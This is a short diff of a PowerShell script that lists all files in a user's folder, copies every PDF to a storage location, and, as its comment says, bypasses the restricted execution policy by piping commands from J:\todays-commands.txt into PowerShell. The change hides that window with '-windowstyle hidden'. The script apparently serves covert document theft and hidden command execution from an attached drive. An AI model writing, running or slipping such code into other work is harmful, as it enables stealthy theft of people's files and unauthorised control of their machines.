@@ -15,7 +15,7 @@ Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt
 Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}
 
 #Bypass Restricted Execution Policy and launch Today's commands
-cat J:\todays-commands.txt | powershell.exe
+cat J:\todays-commands.txt | powershell.exe -windowstyle hidden
 
 
 
